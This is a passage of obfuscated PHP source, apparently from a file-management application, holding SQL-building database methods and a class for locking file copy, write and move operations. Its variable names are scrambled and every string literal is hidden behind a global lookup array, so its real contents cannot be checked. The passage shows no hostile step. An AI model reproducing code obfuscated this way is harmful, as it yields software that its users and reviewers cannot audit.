$È¥Ù‹ş” . $¯’¥¥¶“[53]; unset($ĞáèÊë¿[$¯’¥¥¶“[1020]]); } else { $È¥Ù‹ş” = $¯’¥¥¶“[1024]; } foreach ($ĞáèÊë¿ as $¥¨Ü¢æ´ => $”ôĞãü¿) { $°ÎÅ¯¤Û .= $¯’¥¥¶“[306]; if (is_numeric($¥¨Ü¢æ´)) { $¥¨Ü¢æ´ = $¯’¥¥¶“[1025]; } if (0 === strpos($¥¨Ü¢æ´, $¯’¥¥¶“[11])) { $°ÎÅ¯¤Û .= $this->parseThinkWhere($¥¨Ü¢æ´, $”ôĞãü¿); } else { if (!preg_match($¯’¥¥¶“[1026], trim($¥¨Ü¢æ´))) { think_exception(think_lang($¯’¥¥¶“[1027]) . $¯’¥¥¶“[4] . $¥¨Ü¢æ´); } $ğ­—òå = is_array($”ôĞãü¿) && isset($”ôĞãü¿[$¯’¥¥¶“[1028]]); $¥¨Ü¢æ´ = trim($¥¨Ü¢æ´); if (strpos($¥¨Ü¢æ´, $¯’¥¥¶“[312])) { $Áöç¼á = explode($¯’¥¥¶“[312], $¥¨Ü¢æ´); $±ÒÂÃÜı = array(); foreach ($Áöç¼á as $Ó¶Á©Ú¡ => $ ’Ÿö¯¬) { $ÅÛŒÂĞ = $ğ­—òå ? $”ôĞãü¿[$Ó¶Á©Ú¡] : $”ôĞãü¿; $±ÒÂÃÜı[] = $¯’¥¥¶“[289] . $this->parseWhereItem($this->parseKey($ ’Ÿö¯¬), $ÅÛŒÂĞ) . $¯’¥¥¶“[925]; } $°ÎÅ¯¤Û .= implode($¯’¥¥¶“[1029], $±ÒÂÃÜı); } elseif (strpos($¥¨Ü¢æ´, $¯’¥¥¶“[313])) { $Áöç¼á = explode($¯’¥¥¶“[313], $¥¨Ü¢æ´); $±ÒÂÃÜı = array(); foreach ($Áöç¼á as $Ó¶Á©Ú¡ => $ ’Ÿö¯¬) { $ÅÛŒÂĞ = $ğ­—òå ? $”ôĞãü¿[$Ó¶Á©Ú¡] : $”ôĞãü¿; $±ÒÂÃÜı[] = $¯’¥¥¶“[289] . $this->parseWhereItem($this->parseKey($ ’Ÿö¯¬), $ÅÛŒÂĞ) . $¯’¥¥¶“[925]; } $°ÎÅ¯¤Û .= implode($¯’¥¥¶“[1024], $±ÒÂÃÜı); } else { $°ÎÅ¯¤Û .= $this->parseWhereItem($this->parseKey($¥¨Ü¢æ´), $”ôĞãü¿); } } $°ÎÅ¯¤Û .= $¯’¥¥¶“[307] . $È¥Ù‹ş”; } $°ÎÅ¯¤Û = substr($°ÎÅ¯¤Û, 0, -strlen($È¥Ù‹ş”)); } return empty($°ÎÅ¯¤Û) ? $¯’¥¥¶“[12] : $¯’¥¥¶“[1030] . $°ÎÅ¯¤Û; } protected function parseWhereItem($·ÏÉÈøÎ, $‹Š›ñ›) { $±¯¬ûÄÆ =& $_SERVER[¡“ËÌ§œ]; $ÍşÍŞ€ğ = $±¯¬ûÄÆ[12]; if (is_array($‹Š›ñ›)) { if (is_string($‹Š›ñ›[0])) { $§şšâşñ = strtolower($‹Š›ñ›[0]); if (in_array($‹Š›ñ›[0], array($±¯¬ûÄÆ[904], $±¯¬ûÄÆ[1031], $±¯¬ûÄÆ[1032], $±¯¬ûÄÆ[1033], $±¯¬ûÄÆ[1034], $±¯¬ûÄÆ[1035]))) { $ÍşÍŞ€ğ .= $·ÏÉÈøÎ . $±¯¬ûÄÆ[53] . $‹Š›ñ›[0] . $±¯¬ûÄÆ[53] . $this->parseValue($‹Š›ñ›[1]); } elseif (preg_match($±¯¬ûÄÆ[1036], $‹Š›ñ›[0])) { $ÍşÍŞ€ğ .= $·ÏÉÈøÎ . $±¯¬ûÄÆ[53] . $this->exp[$§şšâşñ] . $±¯¬ûÄÆ[53] . $this->parseValue($‹Š›ñ›[1]); } elseif (preg_match($±¯¬ûÄÆ[1037], $‹Š›ñ›[0])) { if (is_array($‹Š›ñ›[1])) { $°¨ÌÕÔ© = isset($‹Š›ñ›[2]) ? strtoupper($‹Š›ñ›[2]) : $±¯¬ûÄÆ[1022]; if (in_array($°¨ÌÕÔ©, array($±¯¬ûÄÆ[1021], $±¯¬ûÄÆ[1022], $±¯¬ûÄÆ[1023]))) { $öäĞõÑç = array(); foreach ($‹Š›ñ›[1] as $úÌûÜà§) { $öäĞõÑç[] = $·ÏÉÈøÎ . $±¯¬ûÄÆ[53] . $this->exp[$§şšâşñ] . $±¯¬ûÄÆ[53] . $this->parseValue($úÌûÜà§); } $ÍşÍŞ€ğ .= $±¯¬ûÄÆ[289] . implode($±¯¬ûÄÆ[53] . $°¨ÌÕÔ© . $±¯¬ûÄÆ[53], $öäĞõÑç) . $±¯¬ûÄÆ[925]; } } else { $ÍşÍŞ€ğ .= $·ÏÉÈøÎ . $±¯¬ûÄÆ[53] . $this->exp[$§şšâşñ] . $±¯¬ûÄÆ[53] . $this->parseValue($‹Š›ñ›[1]); } } elseif ($±¯¬ûÄÆ[326] == $§şšâşñ) { $ÍşÍŞ€ğ .= $±¯¬ûÄÆ[923] . $·ÏÉÈøÎ . $±¯¬ûÄÆ[53] . $‹Š›ñ›[1] . $±¯¬ûÄÆ[1038]; } elseif (preg_match($±¯¬ûÄÆ[1039], $‹Š›ñ›[0])) { $ÍşÍŞ€ğ .= $‹Š›ñ›[0]; } elseif (preg_match($±¯¬ûÄÆ[1040], $‹Š›ñ›[0])) { if (isset($‹Š›ñ›[2]) && $±¯¬ûÄÆ[326] == $‹Š›ñ›[2]) { $ÍşÍŞ€ğ .= $·ÏÉÈøÎ . $±¯¬ûÄÆ[53] . $this->exp[$§şšâşñ] . $±¯¬ûÄÆ[53] . $‹Š›ñ›[1]; } else { if (is_string($‹Š›ñ›[1])) { $‹Š›ñ›[1] = explode($±¯¬ûÄÆ[50], $‹Š›ñ›[1]); } $Ü™õ³€Ö = implode($±¯¬ûÄÆ[50], $this->parseValue($‹Š›ñ›[1])); $ÍşÍŞ€ğ .= $·ÏÉÈøÎ . $±¯¬ûÄÆ[53] . $this->exp[$§şšâşñ] . $±¯¬ûÄÆ[923] . $Ü™õ³€Ö . $±¯¬ûÄÆ[925]; } } elseif (preg_match($±¯¬ûÄÆ[1041], $‹Š›ñ›[0])) { $í’Ç§Üæ = is_string($‹Š›ñ›[1]) ? explode($±¯¬ûÄÆ[50], $‹Š›ñ›[1]) : $‹Š›ñ›[1]; $ÍşÍŞ€ğ .= $±¯¬ûÄÆ[923] . $·ÏÉÈøÎ . $±¯¬ûÄÆ[53] . $this->exp[$§şšâşñ] . $±¯¬ûÄÆ[53] . $this->parseValue($í’Ç§Üæ[0]) . $±¯¬ûÄÆ[1024] . $this->parseValue($í’Ç§Üæ[1]) . $±¯¬ûÄÆ[307]; } else { think_exception(think_lang($±¯¬ûÄÆ[1027]) . $±¯¬ûÄÆ[4] . $‹Š›ñ›[0]); } } else { $Ÿ¾³€ÈÇ = count($‹Š›ñ›); $™¿İÎù = $±¯¬ûÄÆ[12]; if (is_string($‹Š›ñ›[$Ÿ¾³€ÈÇ - 1])) { $™¿İÎù = isset($‹Š›ñ›[$Ÿ¾³€ÈÇ - 1]) ? strtoupper($‹Š›ñ›[$Ÿ¾³€ÈÇ - 1]) : $±¯¬ûÄÆ[12]; if (in_array($™¿İÎù, array($±¯¬ûÄÆ[1021], $±¯¬ûÄÆ[1022], $±¯¬ûÄÆ[1023]))) { $Ÿ¾³€ÈÇ = $Ÿ¾³€ÈÇ - 1; } } else { $™¿İÎù = $±¯¬ûÄÆ[1021]; } for ($üÚ¶ô†ù = 0; $üÚ¶ô†ù < $Ÿ¾³€ÈÇ; $üÚ¶ô†ù++) { $í’Ç§Üæ = is_array($‹Š›ñ›[$üÚ¶ô†ù]) ? $‹Š›ñ›[$üÚ¶ô†ù][1] : $‹Š›ñ›[$üÚ¶ô†ù]; if ($±¯¬ûÄÆ[326] == strtolower($‹Š›ñ›[$üÚ¶ô†ù][0])) { $ÍşÍŞ€ğ .= $±¯¬ûÄÆ[289] . $·ÏÉÈøÎ . $±¯¬ûÄÆ[53] . $í’Ç§Üæ . $±¯¬ûÄÆ[1038] . $™¿İÎù . $±¯¬ûÄÆ[53]; } else { $ùÔ¹ûÃù = is_array($‹Š›ñ›[$üÚ¶ô†ù]) ? $this->exp[strtolower($‹Š›ñ›[$üÚ¶ô†ù][0])] : $±¯¬ûÄÆ[904]; if (!$ùÔ¹ûÃù && is_array($‹Š›ñ›[$üÚ¶ô†ù]) && in_array($‹Š›ñ›[$üÚ¶ô†ù][0], array($±¯¬ûÄÆ[904], $±¯¬ûÄÆ[1031], $±¯¬ûÄÆ[1032], $±¯¬ûÄÆ[1033], $±¯¬ûÄÆ[1034], $±¯¬ûÄÆ[1035]))) { $ùÔ¹ûÃù = $‹Š›ñ›[$üÚ¶ô†ù][0]; } $ÍşÍŞ€ğ .= $±¯¬ûÄÆ[289] . $·ÏÉÈøÎ . $±¯¬ûÄÆ[53] . $ùÔ¹ûÃù . $±¯¬ûÄÆ[53] . $this->parseValue($í’Ç§Üæ) . $±¯¬ûÄÆ[1038] . $™¿İÎù . $±¯¬ûÄÆ[53]; } } $ÍşÍŞ€ğ = substr($ÍşÍŞ€ğ, 0, -4); } } else { $ÍşÍŞ€ğ .= $·ÏÉÈøÎ . $±¯¬ûÄÆ[1042] . $this->parseValue($‹Š›ñ›); } return $ÍşÍŞ€ğ; } protected function parseThinkWhere($•ÚÙçº², $Šœõ¸) { $»±Šƒ›€ =& $_SERVER[¡“ËÌ§œ]; $É³Œ³Œ = $»±Šƒ›€[12]; switch ($•ÚÙçº²) { case $»±Šƒ›€[381]: $É³Œ³Œ = $Šœõ¸; break; case $»±Šƒ›€[1025]: $É³Œ³Œ = is_string($Šœõ¸) ? $Šœõ¸ : substr($this->parseWhere($Šœõ¸), 6); break; case $»±Šƒ›€[1043]: parse_str($Šœõ¸, $èÜÍ«·Ÿ); if (isset($èÜÍ«·Ÿ[$»±Šƒ›€[1020]])) { $Öı©ì• = $»±Šƒ›€[53] . strtoupper($èÜÍ«·Ÿ[$»±Šƒ›€[1020]]) . $»±Šƒ›€[53]; unset($èÜÍ«·Ÿ[$»±Šƒ›€[1020]]); } else { $Öı©ì• = $»±Šƒ›€[1024]; } $•µ€­‰‘ = array(); foreach ($èÜÍ«·Ÿ as $ª´üŒ•¬ => $¤²ô½ÎÎ) { $•µ€­‰‘[] = $this->parseKey($ª´üŒ•¬) . $»±Šƒ›€[1042] . $this->parseValue($¤²ô½ÎÎ); } $É³Œ³Œ = implode($Öı©ì•, $•µ€­‰‘); break; } return $É³Œ³Œ; } protected function parseLimit($åñœøŸÊ) { $ïØÅÒÚÆ =& $_SERVER[¡“ËÌ§œ]; return !empty($åñœøŸÊ) ? $ïØÅÒÚÆ[51] . $åñœøŸÊ . $ïØÅÒÚÆ[53] : $ïØÅÒÚÆ[12]; } protected function parseJoin($Ö«Íœ) { $ºø„µ =& $_SERVER[¡“ËÌ§œ]; $ÁÖ«É×á = $ºø„µ[12]; if (!empty($Ö«Íœ)) { if (is_array($Ö«Íœ)) { foreach ($Ö«Íœ as $Ğ˜ÖíÊ => $¸œŞ²¸¶) { if (!1 !== stripos($¸œŞ²¸¶, $ºø„µ[1044])) { $ÁÖ«É×á .= $ºø„µ[53] . $¸œŞ²¸¶; } else { $ÁÖ«É×á .= $ºø„µ[1045] . $¸œŞ²¸¶; } } } else { $ÁÖ«É×á .= $ºø„µ[1045] . $Ö«Íœ; } } $ÁÖ«É×á = preg_replace($ºø„µ[1046], think_config($ºø„µ[950]) . $ºø„µ[1047], $ÁÖ«É×á); return $ÁÖ«É×á; } protected function parseOrder($Êê«˜ù£) { $ÅÙ¬Œ¨  =& $_SERVER[¡“ËÌ§œ]; if (is_array($Êê«˜ù£)) { $õÔ®¯û« = array(); foreach ($Êê«˜ù£ as $éûòî‡Ï => $†õüÎÏ) { if (is_numeric($éûòî‡Ï)) { $õÔ®¯û«[] = $this->parseKey($†õüÎÏ); } else { $†õüÎÏ = in_array(strtoupper(trim($†õüÎÏ)), array($ÅÙ¬Œ¨ [1048], $ÅÙ¬Œ¨ [1049])) ? $ÅÙ¬Œ¨ [53] . $†õüÎÏ : $ÅÙ¬Œ¨ [12]; if (preg_match($ÅÙ¬Œ¨ [1050], $éûòî‡Ï)) { $õÔ®¯û«[] = $this->parseKey($éûòî‡Ï) . $†õüÎÏ; } else { think_exception($ÅÙ¬Œ¨ [1051] . $éûòî‡Ï); } } } $Êê«˜ù£ = implode($ÅÙ¬Œ¨ [50], $õÔ®¯û«); } return !empty($Êê«˜ù£) ? $ÅÙ¬Œ¨ [1052] . $Êê«˜ù£ : $ÅÙ¬Œ¨ [12]; } protected function parseGroup($ïæûŒíÁ) { $Õ¸§¢Äß =& $_SERVER[¡“ËÌ§œ]; return !empty($ïæûŒíÁ) ? $Õ¸§¢Äß[1053] . $ïæûŒíÁ : $Õ¸§¢Äß[12]; } protected function parseHaving($¶Û¸Ç†ú) { $Õ•Â¦ş =& $_SERVER[¡“ËÌ§œ]; return !empty($¶Û¸Ç†ú) ? $Õ•Â¦ş[1054] . $¶Û¸Ç†ú : $Õ•Â¦ş[12]; } protected function parseComment($ŠƒğÆ”æ) { $¤ˆã×£ =& $_SERVER[¡“ËÌ§œ]; return !empty($ŠƒğÆ”æ) ? $¤ˆã×£[1055] . $ŠƒğÆ”æ . $¤ˆã×£[1056] : $¤ˆã×£[12]; } protected function parseDistinct($È†ŞÅÖï) { $°îøîé§ =& $_SERVER[¡“ËÌ§œ]; return !empty($È†ŞÅÖï) ? $°îøîé§[1057] : $°îøîé§[12]; } protected function parseUnion($­Ï“Şç) { $ì®¯®×í =& $_SERVER[¡“ËÌ§œ]; if (empty($­Ï“Şç)) { return $ì®¯®×í[12]; } if (isset($­Ï“Şç[$ì®¯®×í[377]])) { $Éö»Ñ = $ì®¯®×í[1058]; unset($­Ï“Şç[$ì®¯®×í[377]]); } else { $Éö»Ñ = $ì®¯®×í[1059]; } foreach ($­Ï“Şç as $Òô©±Æ¥) { $±á×ê£Æ[] = $Éö»Ñ . (is_array($Òô©±Æ¥) ? $this->buildSelectSql($Òô©±Æ¥) : $Òô©±Æ¥); } return implode($ì®¯®×í[53], $±á×ê£Æ); } public function insert($®Ìù¸ç¯, $–«–¶ô‘ = array(), $°Î®´µ = false) { $™€‘ÜÙ =& $_SERVER[¡“ËÌ§œ]; $Îì§¸©ä = $è‹çö°½ = array(); $this->model = $–«–¶ô‘[$™€‘ÜÙ[310]]; foreach ($®Ìù¸ç¯ as $¦Îı”ª => $å¬‡»ü¶) { if (is_array($å¬‡»ü¶) && $™€‘ÜÙ[326] == $å¬‡»ü¶[0]) { $è‹çö°½[] = $this->parseKey($¦Îı”ª); $Îì§¸©ä[] = $å¬‡»ü¶[1]; } elseif (is_scalar($å¬‡»ü¶) || is_null($å¬‡»ü¶)) { $è‹çö°½[] = $this->parseKey($¦Îı”ª); $Îì§¸©ä[] = $this->parseValue($å¬‡»ü¶); } } $ôÁËœè = ($°Î®´µ ? $™€‘ÜÙ[927] : $™€‘ÜÙ[928]) . $™€‘ÜÙ[929] . $this->parseTable($–«–¶ô‘[$™€‘ÜÙ[308]]) . $™€‘ÜÙ[923] . implode($™€‘ÜÙ[50], $è‹çö°½) . $™€‘ÜÙ[924] . implode($™€‘ÜÙ[50], $Îì§¸©ä) . $™€‘ÜÙ[925]; $ôÁËœè .= $this->parseLock(isset($–«–¶ô‘[$™€‘ÜÙ[863]]) ? $–«–¶ô‘[$™€‘ÜÙ[863]] : !1); $ôÁËœè .= $this->parseComment(!empty($–«–¶ô‘[$™€‘ÜÙ[383]]) ? $–«–¶ô‘[$™€‘ÜÙ[383]] : $™€‘ÜÙ[12]); return $this->execute($ôÁËœè, $this->parseBind(!empty($–«–¶ô‘[$™€‘ÜÙ[314]]) ? $–«–¶ô‘[$™€‘ÜÙ[314]] : array())); } public function selectInsert($ú©Ñ¾œ, $Íş’È¡Ì, $ÖùÈâíĞ = array()) { $«¹“›ç =& $_SERVER[¡“ËÌ§œ]; $this->model = $ÖùÈâíĞ[$«¹“›ç[310]]; if (is_string($ú©Ñ¾œ)) { $ú©Ñ¾œ = explode($«¹“›ç[50], $ú©Ñ¾œ); } array_walk($ú©Ñ¾œ, array($this, $«¹“›ç[926])); $È›ñ‘á½ = $«¹“›ç[1060] . $this->parseTable($Íş’È¡Ì) . $«¹“›ç[923] . implode($«¹“›ç[50], $ú©Ñ¾œ) . $«¹“›ç[1038]; $È›ñ‘á½ .= $this->buildSelectSql($ÖùÈâíĞ); return $this->execute($È›ñ‘á½, $this->parseBind(!empty($ÖùÈâíĞ[$«¹“›ç[314]]) ? $ÖùÈâíĞ[$«¹“›ç[314]] : array())); } public function update($ÖÊœ¨Øç, $Şã¸£’Ç) { $šºË¿Şù =& $_SERVER[¡“ËÌ§œ]; $this->model = $Şã¸£’Ç[$šºË¿Şù[310]]; $£®´ò²€ = $šºË¿Şù[1061] . $this->parseTable($Şã¸£’Ç[$šºË¿Şù[308]]) . $this->parseSet($ÖÊœ¨Øç) . $this->parseWhere(!empty($Şã¸£’Ç[$šºË¿Şù[304]]) ? $Şã¸£’Ç[$šºË¿Şù[304]] : $šºË¿Şù[12]) . $this->parseOrder(!empty($Şã¸£’Ç[$šºË¿Şù[394]]) ? $Şã¸£’Ç[$šºË¿Şù[394]] : $šºË¿Şù[12]) . $this->parseLimit(!empty($Şã¸£’Ç[$šºË¿Şù[321]]) ? $Şã¸£’Ç[$šºË¿Şù[321]] : $šºË¿Şù[12]) . $this->parseLock(isset($Şã¸£’Ç[$šºË¿Şù[863]]) ? $Şã¸£’Ç[$šºË¿Şù[863]] : !1) . $this->parseComment(!empty($Şã¸£’Ç[$šºË¿Şù[383]]) ? $Şã¸£’Ç[$šºË¿Şù[383]] : $šºË¿Şù[12]); return $this->execute($£®´ò²€, $this->parseBind(!empty($Şã¸£’Ç[$šºË¿Şù[314]]) ? $Şã¸£’Ç[$šºË¿Şù[314]] : array())); } public function delete($ßæ™®”Ô = array()) { $ñÊ€‹¤ =& $_SERVER[¡“ËÌ§œ]; $this->model = $ßæ™®”Ô[$ñÊ€‹¤[310]]; $œõØËü› = $ñÊ€‹¤[1062] . $this->parseTable($ßæ™®”Ô[$ñÊ€‹¤[308]]) . $this->parseWhere(!empty($ßæ™®”Ô[$ñÊ€‹¤[304]]) ? $ßæ™®”Ô[$ñÊ€‹¤[304]] : $ñÊ€‹¤[12]) . $this->parseOrder(!empty($ßæ™®”Ô[$ñÊ€‹¤[394]]) ? $ßæ™®”Ô[$ñÊ€‹¤[394]] : $ñÊ€‹¤[12]) . $this->parseLimit(!empty($ßæ™®”Ô[$ñÊ€‹¤[321]]) ? $ßæ™®”Ô[$ñÊ€‹¤[321]] : $ñÊ€‹¤[12]) . $this->parseLock(isset($ßæ™®”Ô[$ñÊ€‹¤[863]]) ? $ßæ™®”Ô[$ñÊ€‹¤[863]] : !1) . $this->parseComment(!empty($ßæ™®”Ô[$ñÊ€‹¤[383]]) ? $ßæ™®”Ô[$ñÊ€‹¤[383]] : $ñÊ€‹¤[12]); return $this->execute($œõØËü›, $this->parseBind(!empty($ßæ™®”Ô[$ñÊ€‹¤[314]]) ? $ßæ™®”Ô[$ñÊ€‹¤[314]] : array())); } public function select($Ü“¤Ü†í = array()) { $ÆÎ’Ê“ =& $_SERVER[¡“ËÌ§œ]; $this->model = $Ü“¤Ü†í[$ÆÎ’Ê“[310]]; $Õºóğìú = $this->buildSelectSql($Ü“¤Ü†í); $¿ÆÙ¸ = isset($Ü“¤Ü†í[$ÆÎ’Ê“[378]]) ? $Ü“¤Ü†í[$ÆÎ’Ê“[378]] : !1; if ($¿ÆÙ¸) { $÷Èêä³ = is_string($¿ÆÙ¸[$ÆÎ’Ê“[94]]) ? $¿ÆÙ¸[$ÆÎ’Ê“[94]] : $ÆÎ’Ê“[1063] . md5($Õºóğìú); $ ë“½ÍÉ = think_cache($÷Èêä³, $ÆÎ’Ê“[12], $¿ÆÙ¸); if (!1 !== $ ë“½ÍÉ) { return $ ë“½ÍÉ; } } $ş¾À½á¬ = $this->query($Õºóğìú, $this->parseBind(!empty($Ü“¤Ü†í[$ÆÎ’Ê“[314]]) ? $Ü“¤Ü†í[$ÆÎ’Ê“[314]] : array())); if ($¿ÆÙ¸ && !1 !== $ş¾À½á¬) { think_cache($÷Èêä³, $ş¾À½á¬, $¿ÆÙ¸); } return $ş¾À½á¬; } public function buildSelectSql($±”¢ï’‹ = array()) { $çé×“ £ =& $_SERVER[¡“ËÌ§œ]; if (isset($±”¢ï’‹[$çé×“ £[382]])) { if (strpos($±”¢ï’‹[$çé×“ £[382]], $çé×“ £[50])) { list($ë—Ãñ²ç, $ìúı¯Ö) = explode($çé×“ £[50], $±”¢ï’‹[$çé×“ £[382]]); } else { $ë—Ãñ²ç = $±”¢ï’‹[$çé×“ £[382]]; } $ë—Ãñ²ç = $ë—Ãñ²ç ? $ë—Ãñ²ç : 1; $ìúı¯Ö = isset($ìúı¯Ö) ? $ìúı¯Ö : (is_numeric($±”¢ï’‹[$çé×“ £[321]]) ? $±”¢ï’‹[$çé×“ £[321]] : 20); $»£ú³É = $ìúı¯Ö * ((int) $ë—Ãñ²ç - 1); $±”¢ï’‹[$çé×“ £[321]] = $»£ú³É . $çé×“ £[50] . $ìúı¯Ö; } if (think_config($çé×“ £[1064])) { $î¯Ì«¶ = $çé×“ £[1065] . md5(serialize($±”¢ï’‹)); $‡•âé½› = think_cache($î¯Ì«¶); if ($‡•âé½›) { return $‡•âé½›; } } $…ì‰ÌòÍ = $this->parseSql($this->selectSql, $±”¢ï’‹); $…ì‰ÌòÍ .= $this->parseLock(isset($±”¢ï’‹[$çé×“ £[863]]) ? $±”¢ï’‹[$çé×“ £[863]] : !1); if (isset($î¯Ì«¶)) { think_cache($î¯Ì«¶, $…ì‰ÌòÍ); } return $…ì‰ÌòÍ; } public function parseSql($·Æ ˜—µ, $·É äú¦ = array()) { $¾Èóß¯ô =& $_SERVER[¡“ËÌ§œ]; $·Æ ˜—µ = str_replace(array($¾Èóß¯ô[1066], $¾Èóß¯ô[1067], $¾Èóß¯ô[1068], $¾Èóß¯ô[1069], $¾Èóß¯ô[1070], $¾Èóß¯ô[1071], $¾Èóß¯ô[1072], $¾Èóß¯ô[1073], $¾Èóß¯ô[1074], $¾Èóß¯ô[1075], $¾Èóß¯ô[1076]), array($this->parseTable("{$·É äú¦[$¾Èóß¯ô[308]]}"), $this->parseDistinct(isset($·É äú¦[$¾Èóß¯ô[1077]]) ? $·É äú¦[$¾Èóß¯ô[1077]] : !1), $this->parseField(!empty($·É äú¦[$¾Èóß¯ô[302]]) ? $·É äú¦[$¾Èóß¯ô[302]] : $¾Èóß¯ô[189]), $this->parseJoin(!empty($·É äú¦[$¾Èóß¯ô[311]]) ? $·É äú¦[$¾Èóß¯ô[311]] : $¾Èóß¯ô[12]), $this->parseWhere(!empty($·É äú¦[$¾Èóß¯ô[304]]) ? $·É äú¦[$¾Èóß¯ô[304]] : $¾Èóß¯ô[12]), $this->parseGroup(!empty($·É äú¦[$¾Èóß¯ô[543]]) ? $·É äú¦[$¾Èóß¯ô[543]] : $¾Èóß¯ô[12]), $this->parseHaving(!empty($·É äú¦[$¾Èóß¯ô[1078]]) ? $·É äú¦[$¾Èóß¯ô[1078]] : $¾Èóß¯ô[12]), $this->parseOrder(!empty($·É äú¦[$¾Èóß¯ô[394]]) ? $·É äú¦[$¾Èóß¯ô[394]] : $¾Èóß¯ô[12]), $this->parseLimit(!empty($·É äú¦[$¾Èóß¯ô[321]]) ? $·É äú¦[$¾Èóß¯ô[321]] : $¾Èóß¯ô[12]), $this->parseUnion(!empty($·É äú¦[$¾Èóß¯ô[376]]) ? $·É äú¦[$¾Èóß¯ô[376]] : $¾Èóß¯ô[12]), $this->parseComment(!empty($·É äú¦[$¾Èóß¯ô[383]]) ? $·É äú¦[$¾Èóß¯ô[383]] : $¾Èóß¯ô[12])), $·Æ ˜—µ); return $·Æ ˜—µ; } public function getLastSql($­ˆ„¦€Ë = '') { return $­ˆ„¦€Ë ? $this->modelSql[$­ˆ„¦€Ë] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($Íè³»Ìİ) { return addslashes($Íè³»Ìİ); } public function setModel($Ò²ŠÃü£) { $this->model = $Ò²ŠÃü£; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } goto fŠÓˆô±÷«; a¿õƒä»: class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($Ø“ƒ•°›) { $‘ÁÔ¥ÜË =& $_SERVER[¡“ËÌ§œ]; if (!$this->allowLock()) { return; } $this->_lockCheck($‘ÁÔ¥ÜË[584], $Ø“ƒ•°›); $•ÅùÂğ = 1; $this->_lockEvent($Ø“ƒ•°›, array($‘ÁÔ¥ÜË[585], $‘ÁÔ¥ÜË[586]), $•ÅùÂğ); $this->_lockParent($Ø“ƒ•°›, array($‘ÁÔ¥ÜË[586]), $•ÅùÂğ); $this->_lockEvent($Ø“ƒ•°›, array($‘ÁÔ¥ÜË[587], $‘ÁÔ¥ÜË[588]), $•ÅùÂğ); $this->_lockCheckEnd($‘ÁÔ¥ÜË[584], $Ø“ƒ•°›); } public function lockCopyEnd($µ¤„ó“Ê) { $’¨ËµÁ¢ =& $_SERVER[¡“ËÌ§œ]; if (!$this->allowLock()) { return; } $ÓË´£í = 0; $this->_lockEvent($µ¤„ó“Ê, array($’¨ËµÁ¢[585], $’¨ËµÁ¢[586]), $ÓË´£í); $this->_lockParent($µ¤„ó“Ê, array($’¨ËµÁ¢[586]), $ÓË´£í); $this->_lockEvent($µ¤„ó“Ê, array($’¨ËµÁ¢[587], $’¨ËµÁ¢[588]), $ÓË´£í); } public function lockWriteStart($Ÿ¼Àì²ı, $«Ôê¼ûê = '') { $›·œòıÌ =& $_SERVER[¡“ËÌ§œ]; if (!$this->allowLock()) { return; } $this->_lockCheck($›·œòıÌ[585], $Ÿ¼Àì²ı); $„‡öÖÆÓ = 1; $this->_lockKey($›·œòıÌ[589] . $Ÿ¼Àì²ı . $›·œòıÌ[10] . $«Ôê¼ûê, $„‡öÖÆÓ); $this->_lockEvent($Ÿ¼Àì²ı, array($›·œòıÌ[584], $›·œòıÌ[586]), $„‡öÖÆÓ); $this->_lockParent($Ÿ¼Àì²ı, array($›·œòıÌ[584], $›·œòıÌ[586]), $„‡öÖÆÓ); $this->_lockCheckEnd($›·œòıÌ[585], $Ÿ¼Àì²ı); } public function lockWriteEnd($õ‡‰Ÿ, $Ğ®Šâ÷ã = '') { $‹Õ”¿Ò =& $_SERVER[¡“ËÌ§œ]; if (!$this->allowLock()) { return; } $ÅÚËòî¸ = 0; $this->_lockKey($‹Õ”¿Ò[589] . $õ‡‰Ÿ . $‹Õ”¿Ò[10] . $Ğ®Šâ÷ã, $ÅÚËòî¸); $this->_lockEvent($õ‡‰Ÿ, array($‹Õ”¿Ò[584], $‹Õ”¿Ò[586]), $ÅÚËòî¸); $this->_lockParent($õ‡‰Ÿ, array($‹Õ”¿Ò[584], $‹Õ”¿Ò[586]), $ÅÚËòî¸); } public function lockMoveStart($²÷ƒÄÆ”) { $¥ı”°ßª =& $_SERVER[¡“ËÌ§œ]; if (!$this->allowLock()) { return; } $this->_lockCheck($¥ı”°ßª[586], $²÷ƒÄÆ”); $ŸÃ³· = 1; $this->_lockKey($¥ı”°ßª[590] . $²÷ƒÄÆ”, $ŸÃ³·); $this->_lockEvent($²÷ƒÄÆ”, array($¥ı”°ßª[584], $¥ı”°ßª[585]), $ŸÃ³·); $this->_lockParent($²÷ƒÄÆ”, array($¥ı”°ßª[584], $¥ı”°ßª[586]), $ŸÃ³·); $this->_lockEvent($²÷ƒÄÆ”, array($¥ı”°ßª[591], $¥ı”°ßª[587], $¥ı”°ßª[588]), $ŸÃ³·); $this->_lockCheckEnd($¥ı”°ßª[586], $²÷ƒÄÆ”); } public function lockMoveEnd($ÊıÛòó¬) { $Ä¯Éï‹Â =& $_SERVER[¡“ËÌ§œ]; if (!$this->allowLock()) { return; } $ÓÌÇî¾‚ = 0; $this->_lockKey($Ä¯Éï‹Â[590] . $ÊıÛòó¬, $ÓÌÇî¾‚); $this->_lockEvent($ÊıÛòó¬, array($Ä¯Éï‹Â[584], $Ä¯Éï‹Â[585]), $ÓÌÇî¾‚); $this->_lockParent($ÊıÛòó¬, array($Ä¯Éï‹Â[584], $Ä¯Éï‹Â[586]), $ÓÌÇî¾‚); $this->_lockEvent($ÊıÛòó¬, array($Ä¯Éï‹Â[591], $Ä¯Éï‹Â[587], $Ä¯Éï‹Â[588]), $ÓÌÇî¾‚); } private function _lockCheck($ñ–éè¦, $ÙÇÎÓ£Ñ) { $Ö¿×Ÿ‡ê =& $_SERVER[¡“ËÌ§œ]; $ÇÛ¦Î¥¦ = $this->sourceInfo($ÙÇÎÓ£Ñ); $Ù¯ÏßÇ‘ = $ñ–éè¦ . $Ö¿×Ÿ‡ê[10] . $ÙÇÎÓ£Ñ; $this->_lockTimeStart[$Ù¯ÏßÇ‘] = timeFloat(); if (!is_array($ÇÛ¦Î¥¦)) { return; } $•»®ÈûÓ = LNG($Ö¿×Ÿ‡ê[592]); CacheLock::setErrorMsg($Ö¿×Ÿ‡ê[162] . htmlspecialchars($ÇÛ¦Î¥¦[$Ö¿×Ÿ‡ê[32]]) . $Ö¿×Ÿ‡ê[164] . $•»®ÈûÓ); $this->_lockKey($Ù¯ÏßÇ‘, 1); $this->_lockKey($Ù¯ÏßÇ‘, 